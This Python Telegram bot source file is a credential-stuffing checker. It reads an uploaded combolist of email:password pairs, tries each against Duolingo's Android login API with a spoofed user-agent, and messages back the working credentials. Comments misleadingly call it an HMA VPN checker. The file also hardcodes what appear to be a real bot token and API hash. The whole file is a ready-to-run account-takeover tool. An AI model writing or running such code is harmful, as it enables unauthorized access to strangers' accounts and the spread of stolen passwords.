from pyrogram import Client, filters
import requests
import pyromod
from pyrogram.types import Message

# Telegram bot token (replace with your bot token)
BOT_TOKEN = "6685119417:AAGGYkc1ztEbtILrx3VmY4i8_HgzwhqdRAI"
api_id = 6590520
api_hash = "7f31db7e8cd1c0959c187e2651935c00"
# Initialize Pyrogram client
app = Client("hma_bot",api_id=api_id, api_hash=api_hash, bot_token=BOT_TOKEN)

def hma_login(email, password):
    try:
        url = "https://android-api-cf.duolingo.com/2017-06-30/login?fields=id"
        headers = {
            "host": "android-api-cf.duolingo.com",
            "user-agent": "Duodroid/5.159.4 Dalvik/2.1.0 (Linux; U; Android 15; Redmi Note 15 Pro MIUI/V12.5.2.0.QFHINXM)",
            "accept": "application/json",
            "x-amzn-trace-id": "User=0",
            "content-type": "application/json",
            "accept-encoding": "gzip"
        }
        payload = {
            "distinctId": "null",
            "identifier": email,
            "password": password
        }
        payload['email'] = email
        payload['password'] = password
        response = requests.post(url, json=payload, headers=headers)
        if "id" in response.text:
            return True, "Login successful."
        else:
            return False, "Invalid credentials."
    except Exception as e:
        return False, f"Login Failed: {str(e)}"

# Command handler to check HMA VPN accounts using a combolist file
@app.on_message(filters.command(["hma"]))
async def trans(client, m: Message):
        try:
            editable = await m.reply_text("**Send Text file **")
            input: Message = await app.listen(editable.chat.id)
            x = await input.download()


            path = f"./downloads/"
            editable = await m.reply_text(f"Starting Account Checking.........")

            results = []

            with open(x, 'r') as file:
                for line in file:
                    line = line.strip()
                    if ':' in line:
                        email, password = line.split(':', 1)
                        success, message = hma_login(email, password)
                        if success:
                            result_message = f"Good Login for {email} : {password}"
                            await app.send_message(m.chat.id, result_message)
                        else:
                            result_message = f"Bad Login for {email}: {password} - {message}"
                            await app.send_message(m.chat.id, result_message)
                    else:
                        result_message = f"Invalid line format: {line}"
                        await app.send_message(m.chat.id, result_message)
    
        except Exception as e:
            await app.send_message(m.chat.id, f"An error occurred: {str(e)}")

# Start the bot
if __name__ == "__main__":
    app.run()

